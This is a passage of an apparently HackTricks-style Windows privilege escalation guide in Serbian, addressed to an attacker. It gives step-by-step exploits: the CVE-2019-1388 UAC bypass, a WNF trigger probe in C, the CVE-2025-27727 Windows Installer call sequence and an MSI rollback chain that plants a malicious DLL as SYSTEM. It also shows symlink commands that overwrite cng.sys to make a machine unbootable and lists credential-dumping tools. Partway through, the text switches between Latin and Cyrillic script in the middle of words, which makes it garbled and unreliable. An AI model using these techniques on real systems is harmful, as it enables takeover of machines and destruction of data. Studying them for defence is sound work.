  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Krađa lozinki iz procesa

## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (preko konzole ili RDP-a) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao „NT\AUTHORITY SYSTEM“ iz neprivilegovanog korisničkog naloga.

To omogućava eskalaciju privilegija i istovremeno zaobilaženje UAC-a pomoću iste ranjivosti. Pored toga, nema potrebe da bilo šta instalirate, a binarnu datoteku koja se koristi tokom procesa potpisao je i izdao Microsoft.

Neki od pogođenih sistema su:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Da biste iskoristili ovu ranjivost, potrebno je izvršiti sledeće korake:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Imate sve potrebne datoteke i informacije u sledećem GitHub repozitorijumu:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od Medium do High Integrity Level uz administratorska prava / UAC Bypass

Pročitajte ovo da biste **saznali više o nivoima integriteta**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste saznali više o UAC-u i UAC bypass-ima:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junction-i direktorijuma za otpremanje u korenu koji se poslužuje

Aplikacija može da napravi predvidljiv poddirektorijum za otpremanje, upiše u njega naziv datoteke koji je dostavio pozivalac, a zatim obradi datoteku. Ako korisnik sa niskim privilegijama može da ukloni i zameni taj poddirektorijum NTFS junction-om pre upisa na strani servera, upis može preko junction-a da dospe u direktorijum koji poslužuje web server. Skripta postavljena tamo može da se izvrši pod identitetom web-service naloga ako server izvršava tu vrstu datoteke. Ovo je granica proizvoljnog upisa specifična za aplikaciju; direktorijum za otpremanje sa dozvolom za upis ili postojeći junction sami po sebi nisu dokaz za to.

Proverite tačan način formiranja putanje i vremenski raspored u handler-u za otpremanje, efektivne dozvole korisnika za brisanje/pravljenje poddirektorijuma, efektivne ACL-ove odredišta, da li proces za upis prati reparse points i da li web server izvršava datoteke u tom odredištu. Zasebno potvrdite identitete procesa koji vrši upis i web servera. Pasivni inventar može da prikaže ACL-ove direktorijuma i metapodatke reparse tačaka, ali ne može da utvrdi ponašanje handler-a niti buduću zamenu junction-a. Ako se izvršavanje odvija pod nalogom servisa, pregledajte **stvarni token procesa** pre nego što razmotrite zaseban put preko privilegija tokena.

## Čišćenje privilegovanog zakazanog zadatka pokrenuto preko WNF-a

Zakazani zadatak koji odbija ručno pokretanje ipak može da izloži neprivilegovani okidač. Pri proveri privilegovanog zadatka izvezite njegov XML i pregledajte **sve** okidače, kao i DACL zadatka, principal i akciju. Konkretno, `WnfStateChangeTrigger` navodi stanje Windows Notification Facility (WNF); ako to stanje sa zaštitom dozvoljava trenutnom korisniku da objavi ažuriranje, korisnik može indirektno da pokrene zadatak pod konfigurisanim identitetom uprkos vrednosti `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na primer, zadatak Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` izvršavao se kao SYSTEM, prihvatao ažuriranja WNF stanja `7508BCA32C079E41` od standardnog korisnika, a zatim pregledao `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` čak i kada je Recall bio onemogućen.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Da biste testirali dostupnost, razrešite `ZwUpdateWnfStateData` iz `ntdll.dll`, pošaljite prazno ažuriranje za osmobajtni naziv stanja i uporedite status povratne vrednosti sa podacima o poslednjem pokretanju zadatka ili aktivnošću u Procmon-u. Sledeća pojednostavljena proba koristi niz bajtova iz primera zadatka Recall; zamenite ga bajtovima izvezenim za zadatak koji testirate.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Pretvaranje rekurzivnog čišćenja u privilegovano brisanje

Korisni primitiv nije samo okidač, već privilegovana rutina za čišćenje koja prihvata direktorijum pod kontrolom napadača. Pratite operaciju od enumeracije do konačne izmene: otkrivanje profila/sesija, deca izabrana pomoću džokera, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` snažni su pokazatelji da će se prethodno proverena putanja kasnije rekurzivno obilaziti. Ako se potomci ne otvaraju relativno u odnosu na pouzdane ručke direktorijuma i ne proveravaju pre brisanja, napadač može da promeni razrešavanje putanje između enumeracije i upotrebe.<sup>[[43]](#references)</sup>

Uparite WNF okidač sa [oplock, junction i zamenom simboličke veze Object Manager-a](#from-folder-contents-delete-to-system-eop) opisanom ispod: oplock pauzira čistač nakon što izabere legitimno dete, dok se direktorijum predak koji se može menjati zamenjuje tako da se, kada se privilegovano brisanje nastavi, putanja razreši kroz `\RPC Control` do zaštićenog cilja. U lancu Recall ovo je dovelo do brisanja `C:\Config.Msi` od strane SYSTEM naloga, što je potrebno za dokumentovanu tehniku MSI rollback-a.<sup>[[31]](#references)[[43]](#references)</sup>

### Ugnježdeni potomci zaobilaze plitke popravke reparse tačaka

Provera samo korена pod kontrolom napадаča и његовог непосредног детета не обезбеђује рекурзивно брисање засновано на путањи. Оставите те проверене објекте легитимним и преместите замену junction/oplock у додатно дете испод њих; `IFileOperation::DeleteItem` ће на крају стићи до непровереног потомка и пратити његов нови циљ. CVE-2026-20941 настао је управо због ове врсте непотпуне исправке, након што је прва закрпа за Recall проверила `UKP` и директоријум у облику GUID-а, али задржала стару операцију рекурзивног брисања.<sup>[[43]](#references)</sup>

Безбедан приступ је да отворите **сваког потомка** релативно у односу на већ поуздану ручку директоријума, прибавите и проверите коначну разрешену путању/објекат и примените брисање на ту проверену ручку. Немојте проверавати префикс, а затим се враћати на рекурзивно брисање засновано на путањи. Приликом прегледа закрпе, проверите и структуре на стварном месту позива: у овом случају, преглед у току извршавања структуре `OBJECT_ATTRIBUTES` у `NtCreateFile` показао је да `RootDirectory` није null и да је име релативно — `{GUID}\\secure_file.lock` — чиме је оповргнут обмањујући излаз декомпајлера који је наговештавао други примитив `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Од произвољног брисања/премештања/преименовања фасцикле до SYSTEM EoP

Техника је описана [**у овом блог посту**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), а код експлоата је [**доступан овде**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Напад се у суштини састоји од злоупотребе функције rollback програма Windows Installer ради замене легитимних датотека злонамерним током процеса деинсталације. За то нападач мора да направи **злонамерни MSI инсталер** који ће се користити за отимање фасцикле `C:\Config.Msi`. Windows Installer ће касније ту фасциклу користити за смештање rollback датотека током деинсталације других MSI пакета, а rollback датотеке ће бити измењене тако да садрже злонамерни payload.

### Убризгавање путање чишћења у Windows Installer COM (CVE-2025-27727)

Клијент са ниским привилегијама може да приступи услузи `msiexec.exe` која ради као SYSTEM преко COM објекта `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Реверзним инжењерингом утврђено је да су релевантни позиви `IMsiServer` `MsiBeginTransactionW` на помаку vtable-а `0xA0`, `SetEEUIDirectoryAndFilter` на `0xC8` и `CleanupTempPackages` на `0x50`. Ови називи и помаци добијени су реверзним инжењерингом и могу да се разликују међу верзијама.<sup>[[41]](#references)</sup>

За корисника који није администратор, `SetEEUIDirectoryAndFilter` емулира идентитет позиваоца само док отвара наведену путању са `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` и `FILE_FLAG_OPEN_REPARSE_POINT`. Ово доказује да позивалац може да избрише директоријум и спречава праћење reparse тачке, али **не** повезује проверени објекат датотеке са накнадним чишћењем нити доказује да га је направио Windows Installer.<sup>[[41]](#references)</sup>

Након `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` заказује путању као фасциклу, без обзира на аргумент филтера који је навео позивалац. Услуга уписује именовану вредност `REG_DWORD` у `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: име вредности је путања коју контролише позивалац, а податак `0x00000002` представља ознаку фасцикле. `CleanupTempPackages(NULL, FALSE)` затим непосредно покреће чишћење. Његов радник са повишеним привилегијама набраја вредности регистра и прослеђује ставке фасцикли рекурзивној функцији `FDeleteFolder`, без провере порекла путање. Ако уобичајено уклањање не успе, код такође позива `LockdownPath`, уклања атрибуте датотека и покушава поново.<sup>[[41]](#references)</sup>

Минимални низ позива реконструисан из `msi.dll` је:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Korisni primitiv je ponovno korišćenje putanje, a ne preusmeravanje junction-a. Registrujte `C:\Config.Msi` koju je napravio napadač, uklonite je i pustite da je Windows Installer kasnije ponovo napravi na istoj putanji, ovog puta sa zaštićenim rollback podacima. Čišćenje veruje zastarelom nazivu `TempPackages` i briše novi direktorijum kao SYSTEM. Time se zaobilazi predviđena zaštita koju pružaju `FILE_FLAG_OPEN_REPARSE_POINT` i ublažavanje zasnovano na poverenju u preusmeravanje, jer nije potreban reparse point.<sup>[[41]](#references)</sup>

Ovaj primitiv za brisanje uklapa se u rollback lanac u nastavku: sačuvajte zaseban zapis `Installer\Folders`, obrišite zaštićeni `C:\Config.Msi`, ponovo ga napravite sa NULL DACL-om i zadržite handle sa dozvolom `WRITE_DAC` otvoren pre nego što installer ojača DACL. Unapred otvoreni handle može da vrati permisivni DACL pomoću `NtSetSecurityObject`, nakon čega se generisani `.rbs` može zameniti pre nego što se rollback nastavi.<sup>[[41]](#references)</sup>

Microsoft je ispravio putanju tako što je sprečio `CMsiTransaction::SetEEUIDirectoryAndFilter` da pozove `ScheduleFileOrFolderDelete` kada je omogućena nova kontrola funkcije. COM poziv i dalje može da vrati uspeh, ali više ne dodaje putanju koju kontroliše napadač u `TempPackages`. Instalirajte bezbednosne ispravke za Windows iz aprila 2025. umesto da koristite uspešan povratak metode kao proveru da li je zakrpa primenjena.<sup>[[41]](#references)[[42]](#references)</sup>

Sažeta tehnika je sledeća:

1. **Faza 1 – Priprema otmice (`C:\Config.Msi` ostaje prazna)**

- Korak 1: Instalirajte MSI
    - Napravite `.msi` koji instalira bezopasnu datoteku (npr. `dummy.txt`) u lokaciju u koju može da se upisuje (`TARGETDIR`).
    - Označite installer kao **"UAC Compliant"**, kako bi mogao da ga pokrene **korisnik koji nije administrator**.
    - Ostavite otvoren **handle** ka datoteci nakon instalacije.

- Korak 2: Započnite deinstalaciju
    - Deinstalirajte isti `.msi`.
    - Proces deinstalacije počinje da premešta datoteke u `C:\Config.Msi` i da ih preimenuje u datoteke `.rbf` (rezervne kopije za rollback).
    - **Proveravajte otvoreni handle** pomoću `GetFinalPathNameByHandle` da biste otkrili kada datoteka postane `C:\Config.Msi\<random>.rbf`.

- Korak 3: Prilagođena sinhronizacija
    - `.msi` sadrži **prilagođenu akciju deinstalacije (`SyncOnRbfWritten`)** koja:
        - Signalizira kada je `.rbf` zapisan.
        - Zatim **čeka** na drugi događaj pre nego što nastavi deinstalaciju.

- Korak 4: Sprečite brisanje `.rbf`
    - Kada primite signal, **otvorite datoteku `.rbf`** bez `FILE_SHARE_DELETE` — time **sprečavate njeno brisanje**.
    - Zatim **pošaljite signal nazad** kako bi deinstalacija mogla da se završi.
    - Windows Installer ne uspeva da obriše `.rbf` i, pošto ne može da obriše sav sadržaj, **ne uklanja `C:\Config.Msi`**.

- Korak 5: Ručno obrišite `.rbf`
    - Vi, kao napadač, ručno brišete datoteku `.rbf`.
    - Sada je **`C:\Config.Msi` prazna** i spremna za otmicu.

> U ovom trenutku **pokrenite ranjivost koja omogućava brisanje proizvoljnog direktorijuma na nivou SYSTEM** da biste obrisali `C:\Config.Msi`.

2. **Faza 2 – Zamena rollback skripti zlonamernim skriptama**

- Korak 6: Ponovo napravite `C:\Config.Msi` sa slabim ACL-ovima
    - Sami ponovo napravite direktorijum `C:\Config.Msi`.
    - Postavite **slabe DACL-ove** (npr. Everyone:F) i **ostavite otvoren handle** sa dozvolom `WRITE_DAC`.

- Korak 7: Pokrenite novu instalaciju
    - Ponovo instalirajte `.msi` sa sledećim vrednostima:
        - `TARGETDIR`: lokacija u koju može da se upisuje.
        - `ERROROUT`: promenljiva koja izaziva prisilnu grešku.
    - Ova instalacija će poslužiti za ponovno pokretanje **rollback-a**, koji čita `.rbs` i `.rbf`.

- Korak 8: Pratite pojavu `.rbs`
    - Koristite `ReadDirectoryChangesW` da pratite `C:\Config.Msi` dok se ne pojavi nova datoteka `.rbs`.
    - Zabeležite njeno ime.

- Korak 9: Sinhronizujte se pre rollback-a
    - `.msi` sadrži **prilagođenu akciju instalacije (`SyncBeforeRollback`)** koja:
        - Signalizira događaj kada se kreira `.rbs`.
        - Zatim **čeka** pre nego što nastavi.

- Korak 10: Ponovo primenite slabe ACL-ove
    - Nakon prijema događaja `.rbs created`:
        - Windows Installer **ponovo primenjuje jake ACL-ove** na `C:\Config.Msi`.
        - Ali, pošto još uvek imate handle sa dozvolom `WRITE_DAC`, možete **ponovo da primenite slabe ACL-ove**.

> ACL-ovi se **proveravaju samo prilikom otvaranja handle-a**, tako da i dalje možete da upisujete u direktorijum.

- Korak 11: Postavite lažne `.rbs` i `.rbf`
    - Zamenite datoteku `.rbs` **lažnom rollback skriptom** koja Windows-u nalaže da:
        - Vrati vašu datoteku `.rbf` (zlonamernu DLL) na **privilegovanu lokaciju** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Postavite lažnu datoteku `.rbf` koja sadrži **zlonamerni DLL payload na nivou SYSTEM**.

- Korak 12: Pokrenite rollback
    - Signalizirajte događaj za sinhronizaciju da bi installer nastavio.
    - **Prilagođena akcija tipa 19 (`ErrorOut`)** podešena je tako da **namerno izazove neuspeh instalacije** u poznatom trenutku.
    - Time se pokreće **rollback**.

- Korak 13: SYSTEM instalira vaš DLL
    - Windows Installer:
        - Čita vaš zlonamerni `.rbs`.
        - Kopira vaš DLL iz `.rbf` na ciljnu lokaciju.
    - Vaš **zlonamerni DLL sada se nalazi na putanji koju učитава SYSTEM**.

- Završni korak: Izvršite SYSTEM kod
    - Pokrenite pouzdanu **auto-elevated binarnu datoteku** (npr. `osk.exe`) koja učitava DLL koju ste oteli.
    - **Gotovo**: vaš kod se izvršava **kao SYSTEM**.


### Od proizvoljnog brisanja/premeštanja/preimenovanja datoteka do SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možete da obrišete **čitav direktorijum** (npr. `C:\Config.Msi`). Ali šta ako vaša ranjivost omogućava samo **brisanje proizvoljnih datoteka**?

Možete da iskoristite **NTFS interne mehanizme**: svaki direktorijum ima skriveni alternativni tok podataka koji se zove:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ovaj stream čuva **metapodatke indeksa** fascikle.

Dakle, ako **izbrišete stream `::$INDEX_ALLOCATION`** fascikle, NTFS **uklanja celu fasciklu** iz sistema datoteka.

To možete da uradite pomoću standardnih API-ja za brisanje datoteka, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Iako pozivate API za brisanje *datoteke*, on **briše samu fasciklu**.

### Od brisanja sadržaja fascikle do SYSTEM EoP
Šta ako vaš primitiv ne omogućava brisanje proizvoljnih datoteka/fascikli, ali **omogućava brisanje *sadržaja* fascikle koju kontroliše napadač**?

1. Korak 1: Podesite fasciklu i datoteku kao mamac
- Kreirajte: `C:\temp\folder1`
- Unutar nje: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- Oplock **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Korak 3: Pokrenite SYSTEM proces (npr., `SilentCleanup`)
- Ovaj proces skenira fascikle (npr., `%TEMP%`) i pokušava da izbriše njihov sadržaj.
- Kada dođe do `file1.txt`, **oplock se aktivira** i predaje kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
    - Time se prazni `folder1` bez prekidanja oplock-a.
    - Nemojte direktno da brišete `file1.txt` — to bi prerano oslobodilo oplock.

- Opcija B: Pretvorite `folder1` u **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcija C: Kreirajte **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ovo cilja interni NTFS tok u kom se čuvaju metapodaci fascikle — njegovim brisanjem briše se fascikla.

5. Korak 5: Oslobodite oplock
- SYSTEM proces nastavlja da radi i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction + symlink-a, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Rezultat**: `C:\Config.Msi` briše SYSTEM.

### Od kreiranja proizvoljne fascikle do trajnog DoS-a

Iskoristite primitivu koja vam omogućava da **kreirate proizvoljnu fasciklu kao SYSTEM/admin** — čak i ako **ne možete da upisujete datoteke** ili **podesite slabe dozvole**.

Kreirajte **fasciklu** (ne datoteku) sa imenom **kritičnog Windows drajvera**, npr.:
```
C:\Windows\System32\cng.sys
```

- Ova putanja obično odgovara kernel-mode drajveru `cng.sys`.
- Ako je **unapred kreirate kao fasciklu**, Windows neće uspeti da učita stvarni drajver pri pokretanju.
- Zatim Windows pokušava da učita `cng.sys` tokom pokretanja.
- Nailazi na fasciklu, **ne uspeva da pronađe stvarni drajver** i **ruši sistem ili zaustavlja pokretanje**.
- **Nema fallback opcije** ni **oporavka** bez spoljne intervencije (npr. popravke pokretanja ili pristupa disku).

### Od privilegovanih putanja za logove/backup + OM symlinks do arbitrary file overwrite / boot DoS

Kada **privilegovana usluga** upisuje logove/izvozi podatke na putanju pročitanu iz **config fajla koji može da se menja**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste privilegovani upis pretvorili u arbitrary overwrite (čak i **bez SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Zahtevi**
- Config u kom je sačuvana ciljna putanja može da menja napadač (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Privilegovana operacija koja upisuje na tu putanju (log, izvoz, izveštaj).

**Primer lanca**
1. Pročitajte config da biste utvrdili odredište privilegovanog loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez administratorskih privilegija:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. administrator pokrene „send test SMS“). Upis se sada vrši u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisanu datoteku (hex/PE parserom) da biste potvrdili oštećenje; ponovno pokretanje primorava Windows da učita izmenjenu putanju drajvera → **boot loop DoS**. Ovo se može primeniti i na bilo koju zaštićenu datoteku koju će privilegovana usluga otvoriti za pisanje.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako kopija postoji u `C:\Windows\System32\cng.sys`, Windows može prvo da pokuša da učita nju, što je čini pouzdanim odredištem za DoS pomoću oštećenih podataka.



## **Od High Integrity do SYSTEM**

### **Nova usluga**

Ako već radite u procesu sa nivoom integriteta High Integrity, **put do SYSTEM-a** može biti lak — samo **kreirajte i pokrenite novu uslugu**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Prilikom kreiranja service binary-ja, uverite se da je validan service ili da binary brzo obavlja neophodne radnje, jer će biti zaustavljen za 20 sekundi ako nije validan service.

### AlwaysInstallElevated

Iz procesa visokog integriteta možete pokušati da **omogućite registry unose AlwaysInstallElevated** i **instalirate** reverse shell pomoću _**.msi**_ omotača.\
[Više informacija o uključenim registry ključevima i o tome kako da instalirate _.msi_ paket potražite ovde.](#alwaysinstallelevated)

### Visok integritet + privilegija SeImpersonate do System

**Kod možete** [**pronaći ovde**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do privilegija Full Token

Ako imate te privilegije tokena (verovatno ćete ih pronaći u procesu koji već ima visok integritet), moći ćete da **otvorite skoro svaki proces** (osim zaštićenih procesa) pomoću privilegije SeDebug, **kopirate token** procesa i kreirate **proizvoljan proces sa tim tokenom**.\
Ova tehnika obično podrazumeva **izbor bilo kog procesa koji se pokreće kao SYSTEM i ima sve privilegije tokena** (_da, možete pronaći SYSTEM procese koji nemaju sve privilegije tokena_).\
**Primer koda koji izvršava predloženu tehniku možete** [**pronaći ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju u `getsystem`. Tehnika se sastoji od **kreiranja pipe-a, a zatim kreiranja/zloupotrebe service-a za upisivanje u taj pipe**. Zatim će **server** koji je kreirao pipe pomoću privilegije **`SeImpersonate`** moći da **imitira token** pipe klijenta (service-a) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o name pipes, pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**prelaska sa visokog integriteta na System pomoću name pipes, pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **otmete dll** koji **učitava** **proces** pokrenut kao **SYSTEM**, moći ćete da izvršite proizvoljan kod sa tim dozvolama. Zato je Dll Hijacking koristan i za ovu vrstu eskalacije privilegija, a uz to ga je **mnogo lakše izvesti iz procesa visokog integriteta**, jer će taj proces imati **dozvole za upisivanje** u fascikle koje se koriste za učitavanje dll-ova.\
**Više o Dll hijacking-u možete** [**saznati ovde**](dll-hijacking/index.html)**.**

### **Od Administrator ili Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE ili NETWORK SERVICE do svih privilegija

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Dodatna pomoć

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Korisni alati

**Najbolji alat za traženje vektora za lokalnu eskalaciju privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava pogrešne konfiguracije i osetljive datoteke (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Otkriven.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava neke moguće pogrešne konfiguracije i prikuplja informacije (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izdvaja sačuvane informacije o sesijama za PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Lokalno koristite -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izdvaja kredencijale iz Credential Manager-a. Otkriven.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Vrši password spraying prikupljenih lozinki preko domena**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS alat za spoofing i napade man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna Windows enumeracija za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate ranjivosti za privesc (ZASTAREO, zamenjen alatom Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(Potrebna su Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate ranjivosti za privesc (potrebno ga je kompajlirati pomoću VisualStudio-a) ([**prekompajlirana verzija**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriše host u potrazi za pogrešnim konfiguracijama (više alat za prikupljanje informacija nego za privesc) (potrebno ga je kompajlirati) **(**[**prekompajlirana verzija**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izdvaja kredencijale iz mnogih programa (prekompajlirani exe na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port alata PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava pogrešne konfiguracije (prekompajlirani izvršni fajl na github-u). Ne preporučuje se. Ne radi dobro u Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe iz python-a). Ne preporučuje se. Ne radi dobro u Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ovog posta (za ispravan rad mu nije potreban accesschk, ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz komande **systeminfo** i predlaže funkcionalne exploite (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz komande **systeminfo** i predlaže funkcionalne exploite (lokalni Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekat morate kompajlirati pomoću odgovarajuće verzije .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na žrtvinom hostu, možete da pokrenete:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```



## References

- [1] [Osnove eskalacije privilegija u Windows-u](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacija privilegija iskorišćavanjem slabih dozvola za fascikle](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacija privilegija u Windows-u – podsetnik](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Radionica za lokalnu eskalaciju privilegija u Windows-u / Linux-u](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Napadi na Windows: AT je novi crni (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
